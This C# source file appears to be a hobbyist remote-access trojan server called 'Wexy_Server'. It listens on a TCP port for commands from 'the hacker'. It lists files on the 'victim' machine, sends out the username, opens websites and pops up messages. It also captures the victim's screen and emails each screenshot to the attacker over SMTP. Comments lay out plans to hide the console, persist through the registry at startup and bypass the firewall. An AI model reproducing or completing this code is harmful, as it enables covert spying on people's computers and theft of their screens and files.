using System.Net.Sockets;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System;
using System.Drawing.Imaging;
using System.Net.Mail;
using System.Collections.Generic;

namespace Wexy_Server
{
    class Server
    {
        public static NetworkStream Receiver;
        public static NetworkStream Writer;

        //[DllImport("user32.dll")]
        //public static extern bool FreeConsole(); //hides the console from view.

        //TODO - > the server hides itself inside the registry and is launched on Windows startup.
        //public static void AddToStartup()

        //TODO - > the server must be able to connect to the internet without being blocked by the firewall
        public static void BypassFirewall()
        {

        }

        //TODO - > the server tells the client he is alive and sends him the victims IP.
        public static void NotifyClient()
        {

        }

     

        public static void ReceiveCommands()
        {
            //Infinite loop 
            while (true)
            {
                //try to read the data from the client(the hacker)
                try
                {
                    //Packet of the received data
                    byte[] RecPacket = new byte[1000];

                    //Read a command from the client.
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Flush the receiver
                    Receiver.Flush();

                    //Convert the packet into readable string
                    string command = Encoding.ASCII.GetString(RecPacket);

                    //Split the command into two different strings based on the splitter we made, >
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(command, ">");

                    //Get the actual command.
                    command = CommandArray[0];


                    switch (command)
                    {
                        case "msg":
                            //Display the message in a messagebox (the trim removes any excess data received)
                            string Msg = CommandArray[1];
                            DisplayMessage(Msg);
                            break;

                        case "open":
                            //Open the website with internet explorer
                            string site = CommandArray[1];
                            OpenWebsite(site);
                            break;

                        case "ss":
                            //Draw the screen and transform it into an actual image
                            TakeScreenshot();
                            break;

                        case "pcname":
                            //NOT FINISHED
                            SendPCName();
                            break;

                        case "showfiles":
                            //TODO
                            string path = CommandArray[1];
                            //string path = @"C:/users/"+Environment.UserName+"/Desktop/";
                            ListFiles(path);
                            break;
                    }
                }
                catch
                {
                    break;
                }
            }
        }


        #region Commands
        // - NOT OK - 
        public static void ListFiles(string location)
        {
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(@location);
            foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
            {
                try
                {
                    byte[] Packet = Encoding.ASCII.GetBytes(f.Name);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
                catch
                {
                    Console.WriteLine("client disconnected from server!");
                    Console.ReadKey();
                    Writer.Close();
                }
            } 
        }

        // - ALMOST OK -
        public static void SendPCName()
        {
            try
            {
                string pcname = Environment.UserName;

                //Creates a packet to hold the command, and gets the bytes from the string variable
                byte[] Packet = Encoding.ASCII.GetBytes(pcname);

                //Send the command over the network
                Writer.Write(Packet, 0, Packet.Length);

                //Flush out any extra data that didnt send in the start.
                Writer.Flush();
            }
            catch
            {
                Console.WriteLine("client disconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }


        // -  OK - 
        public static void TakeScreenshot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg", ImageFormat.Jpeg);
            sendScreenshot();
            System.IO.File.Delete(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
        }

        // - OK - 
        public static void sendScreenshot()
        {
            try
            {
                //Configure the stmp client
                SmtpClient client = new SmtpClient("smtp.live.com");
                client.Port = 587;
                client.EnableSsl = true;
                client.Timeout = 100000;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");

                //Configure the mail to send
                Attachment objAttachment = new Attachment(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
                MailMessage msg = new MailMessage();
                msg.To.Add("your_mail_receiver");
                msg.From = new MailAddress("your_mail_sender");
                msg.Attachments.Add(objAttachment);
                msg.Subject = "New screenshot";
                msg.Body = "Target screen was captured :D";

                client.Send(msg);
            }
            catch
            {
                Console.WriteLine("An error occured when trying to send the mail");
                Console.ReadKey();
                Environment.Exit(0);
                //throw ex;
            }
        }

        // - OK - 
        public static void OpenWebsite(string website)
        {
            System.Diagnostics.Process IE = new System.Diagnostics.Process();
            IE.StartInfo.FileName = "iexplore.exe";
            IE.StartInfo.Arguments = website.Trim('\0');
            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
            IE.Start();
        }


        //- OK - 
        public static void DisplayMessage(string message)
        {
            System.Windows.Forms.MessageBox.Show(message.Trim('\0'));
        }

        #endregion





        static void Main(string[] args)
        {
            //FreeConsole();

            TcpListener l = new TcpListener(System.Net.IPAddress.Any, 2000);
            l.Start();

            //Wait for client to connect, then make a TcpClient to accept the connection
            TcpClient connection = l.AcceptTcpClient();

            //Get Connection's stream
            Receiver = connection.GetStream();

            //I'm not sure thought..
            Writer = connection.GetStream();

            //Start the receive commands thread
            //We will run the ReceiveCommands() method on another thread, so the CPU doesnt go haywire
            System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
            Rec.Start();
        }
    }
}
